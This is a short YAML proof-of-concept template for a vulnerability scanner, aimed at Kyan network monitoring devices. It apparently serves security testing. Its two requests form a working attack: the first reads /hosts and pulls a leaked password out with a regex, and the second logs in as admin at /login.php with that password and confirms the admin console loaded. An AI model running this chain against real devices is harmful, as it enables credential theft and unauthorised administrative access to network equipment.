id: poc-yaml-kyan-network-monitoring-account-password-leakage
info:
  name: Kyan Network Monitoring 凭证代码泄露漏洞
  severity: high
  tags:
  - 信息泄露
  finger: Kyan
  reference: []
  description: null
variables: {}
transport: http
requests:
- method: GET
  path: /hosts
  headers: {}
  data: null
  redirect: false
  raw: null
  timeout: null
  expression: 'true'
  output:
  - regex_match(body,"Password=(?P<pass>.+)")
- method: POST
  path: /login.php
  headers: {}
  data: user=admin&passwd={{.pass}}
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 200 && contains(body, "<title>设备管理系统</title>") && contains(body,
    "context.php") && contains(body, "left.php")
  output: []
